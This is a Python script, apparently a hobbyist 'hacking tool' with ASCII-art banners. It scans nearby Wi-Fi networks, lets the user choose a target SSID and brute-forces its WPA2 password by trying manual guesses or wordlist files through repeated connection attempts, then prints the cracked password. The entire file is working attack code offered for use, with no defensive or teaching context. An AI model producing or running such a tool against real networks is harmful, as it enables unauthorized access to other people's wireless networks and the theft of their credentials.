from colorama import Fore, init
from pywifi import const
from os import system, name
import pywifi
import time
import getpass

init()
list_name = []  
list_signal = []
wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]
list_name12 = []
def clear():
    if name == 'nt':
        system('cls')
    else:
        system('clear')

def logosis():
    init()
    clear()
    pm = f"""
\t{Fore.RED}-------------------------------------------------------------------------------------- 
\t| ██   ██    ███████  █████  ██████  ██████   █████  ██      ██       █████  ██   ██ |
\t| ██   ██    ██      ██   ██ ██   ██ ██   ██ ██   ██ ██      ██      ██   ██ ██   ██ |
\t| ███████    ███████ ███████ ██████  ██████  ███████ ██      ██      ███████ ███████ |
\t| ██   ██         ██ ██   ██ ██   ██ ██   ██ ██   ██ ██      ██      ██   ██ ██   ██ |
\t| ██   ██ ██ ███████ ██   ██ ██   ██ ██   ██ ██   ██ ███████ ███████ ██   ██ ██   ██ |
\t|                                                                                    |
\t|                             {Fore.WHITE}<Coded by A.Vaziri>{Fore.RED}                                    |
\t--------------------------------------------------------------------------------------
                                                                                   
    """
    print(pm)
    for i in range(0,6):
        time.sleep(0.5)
        print(Fore.GREEN+'•')
    print("waiting for Start server...")
    time.sleep(3)
    for j in range(0, 4):
        time.sleep(0.1)
        print('•')
    print(f"{Fore.YELLOW}[{Fore.RED}message from SarrAllaH{Fore.YELLOW}] {Fore.GREEN}Enjoy the tool")
    time.sleep(3)
    clear()
    
    
     
def profiles_net():
    global list_name, iface, wifi
    iface.scan()
    results = iface.scan_results()
    print('loading wifi...')
    for i, result in enumerate(results):
        fps = f"{i+1}. SSID: {result.ssid}, Signal Strength: {result.signal}, key: {result.key}"
        list_name.append(result.ssid)
        list_signal.append(result.signal)
             
def cracker(SSID, passwd):
    global iface, wifi
    init()
    # -------------------info wifi-------------------------
    profile = pywifi.Profile()
    profile.ssid = SSID
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = passwd
    # -----------------------test wifi---------------------
    profile = iface.add_network_profile(profile)
    iface.connect(profile)
    time.sleep(2)
    status = iface.status()
    if status == const.IFACE_CONNECTED:
        print(f"{Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}] {Fore.GREEN}Connected!")
        print(f"{Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}] {Fore.GREEN}wifi name:{SSID} //password:{passwd}")
        exit()
    else:
        print(f"{Fore.YELLOW}[{Fore.RED}-{Fore.YELLOW}] {Fore.RED}Disconnected!")
        
def scan():
    x = 1
    print(f'{Fore.RED}*{Fore.GREEN}WiFi available near us:')
    for ip in list_name:
        time.sleep(0.1)
        print(f"{Fore.RED}{x}) {Fore.WHITE}{ip}\n")
        x += 1
        
def logo():
    pm = f"""
\t{Fore.RED}-------------------------------------------------------------------------------------- 
\t| ██   ██    ███████  █████  ██████  ██████   █████  ██      ██       █████  ██   ██ |
\t| ██   ██    ██      ██   ██ ██   ██ ██   ██ ██   ██ ██      ██      ██   ██ ██   ██ |
\t| ███████    ███████ ███████ ██████  ██████  ███████ ██      ██      ███████ ███████ |
\t| ██   ██         ██ ██   ██ ██   ██ ██   ██ ██   ██ ██      ██      ██   ██ ██   ██ |
\t| ██   ██ ██ ███████ ██   ██ ██   ██ ██   ██ ██   ██ ███████ ███████ ██   ██ ██   ██ |
\t|                                                                                    |
\t|                             {Fore.WHITE}<Coded by A.Vaziri>{Fore.RED}                                    |
\t--------------------------------------------------------------------------------------
                                                                                   
    """
    print(pm)

def main():
    profiles_net()
    init()
    logosis()
    logo()
    print()
    print()
    print()
    scan()
    choose = input(f"{Fore.GREEN}Enter Wifi name target >$")
    choose_last = choose
    choose = choose.lower()
    for ipSELECT in list_name:
        f = str(ipSELECT).lower()
        list_name12.append(f) 
    if choose in list_name12:
        pass
    else:
        print(f"{Fore.GREEN}[{Fore.YELLOW}NOTE{Fore.GREEN}] {Fore.GREEN}I'm very sorry, user {Fore.RED}{getpass.getuser()} {Fore.GREEN}The Wi-Fi name you entered is not available and you have to run the tool again from the beginning")
        time.sleep(5)
        clear()
        exit()
        
    print("choose type test password!\n\t1)Try the password manually\n\t2)password list Default")
    CeH = input("just number available[1/2?]$")
    if CeH == "1":
        print('ok!')
        time.sleep(2)
        clear()
        logo()
        time.sleep(0.1)
        print()
        time.sleep(0.1)
        print()
        time.sleep(0.1)
        print()
        time.sleep(0.1)
        for i in range(0, 10):
            time.sleep(0.1)
            print(f"\t{Fore.RED}Try the password manually.!")
            mnop = input(f"{Fore.WHITE}enter password --->$")
            cracker(choose_last ,mnop)
    elif CeH == '2':
        print('ok!')
        time.sleep(2)
        clear()
        logo()
        time.sleep(0.1)
        print()
        time.sleep(0.1)
        print()
        time.sleep(0.1)
        print()
        time.sleep(0.1)
        cmh = input(f"{Fore.YELLOW}1)passwd1.txt\n2)passwd2.txt\n3)passwd3.txt\n4)wifi_pass.txt\n{Fore.WHITE}which password list?")
        if cmh == '1':
            with open('./passwd1.txt', 'r', encoding='utf-8') as file:
                for password in file:
                    cracker(choose_last, password)
                
        elif cmh == '2':
             with open('./passwd2.txt', 'r', encoding='utf-8') as file:
                for password in file:
                    cracker(choose_last, password)
        elif cmh == '3':
            with open('./passwd3.txt', 'r', encoding='utf-8') as file:
                for password in file:
                    cracker(choose_last, password)
                    
        elif cmh == '4':
             with open('./wifi_pass.txt', 'r', encoding='utf-8') as file:
                for password in file:
                    cracker(choose_last, password)
        else:
            print(Fore.RED+"not found password list!")
    else:
        print('not available! try again!')
    
main()